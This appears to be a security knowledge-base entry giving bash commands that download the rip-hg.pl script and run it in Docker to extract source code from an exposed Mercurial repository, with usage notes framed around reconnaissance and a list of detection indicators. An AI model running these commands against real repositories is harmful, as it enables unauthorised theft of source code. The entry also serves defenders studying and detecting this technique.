---
type: code
language: bash
verified: true
tags:
  - exfiltration
  - mercurial
  - docker
platforms:
  - Linux
validated: true
---

# Download and Run rip-hg.pl via Docker

## Code

```bash
wget https://raw.githubusercontent.com/kost/dvcs-ripper/master/rip-hg.pl
docker run --rm -it -v /path/to/host/work:/work:rw k0st/alpine-dvcs-ripper rip-hg.pl -v -u
```

## Description

This bash code snippet downloads the rip-hg.pl script and then runs it inside a Docker container to extract a Mercurial repository. It combines tool acquisition and execution for streamlined source code exfiltration, using a mounted volume to persist the cloned data on the host.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| /path/to/host/work | Local directory path to mount into the container for output | /home/user/extracted-repo |

## Usage

Execute this snippet in a terminal on a Linux system with Docker installed. Before running the docker line, replace /path/to/host/work with your actual directory and append the target repository URL to the rip-hg.pl command (e.g., rip-hg.pl -v -u https://hg.example.com/repo). This is typically used after identifying an exposed Hg repository during reconnaissance, to pull down code for offline analysis.

## Detection

- Monitor for wget downloads from GitHub raw URLs related to dvcs-ripper.
- Docker daemon logs showing pulls of k0st/alpine-dvcs-ripper image or executions of rip-hg.pl.
- Network traffic to Mercurial ports (8000/tcp) or HTTPS requests to .hg URLs with high data volume.
- File system changes: New .hg directories or sudden appearance of source code files in unexpected locations.

## Related

- [[procedures/mercurial-source-code-extraction-with-rip-hg-pl]]
- [[tools/dvcs-ripper]]
